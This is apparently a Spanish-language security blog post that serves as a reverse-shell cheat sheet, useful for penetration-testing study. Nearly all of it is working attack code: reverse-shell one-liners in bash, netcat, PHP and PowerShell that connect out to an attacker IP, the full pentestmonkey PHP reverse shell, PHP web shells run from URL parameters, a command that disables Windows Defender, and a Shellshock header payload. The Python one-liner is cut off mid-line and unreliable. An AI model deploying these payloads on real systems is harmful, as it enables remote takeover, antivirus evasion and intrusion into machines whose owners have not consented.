---
date: 2021-09-15T00:22:05.000Z
layout: post
comments: true
title: Reverse Shell
subtitle: 'y como obtener acceso'
description: >-
image: >-
  http://imgfz.com/i/8lyF7VZ.jpeg
optimized_image: >-
  http://imgfz.com/i/8lyF7VZ.jpeg
category: ciberseguridad
tags:
  - explotación
  - linux
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

# Ejemplos principales:

### Bash

```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0<&1'
```

### Python

```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```

### Netcat

```bash
#Versiones actualizadas
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ nc -e /bin/sh 10.0.0.1 1234

#Versiones más antiguas
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
```

### PHP
En PHP se puede ingresar un archivo malicioso que devuelva una reverse shell.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.97';
$port = 4646;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Para testear ejecución remota de comandos:

```php
<?php system($_GET[‘ls’]);?>
```

```php
<?php system($_GET[‘cmd’]);?>
```

```php
<?=`$_GET[0]`?>
```

Para obtener una reverse shell por medio de comandos:

```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


Otros códigos se pueden encontrar en el directorio ```/usr/share/webshells/laudanum``` o desde el GitHub de [laudanum](https://github.com/adamcaudill/laudanum).

### PowerShell (cmd)

```
C:\Users\test> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Deshabilitar Antivirus

```powershell
PS C:\Users\test> Set-MpPreference -DisableRealtimeMonitoring $true
```

### Ejemplo de uso
En burpsuite se podría ocupar en ataques como Shellshock, por ejemplo:
```bash
#Se ocupa como base un proceso como este...
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```
```bash
#Acá se adapta el proceso...
User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```
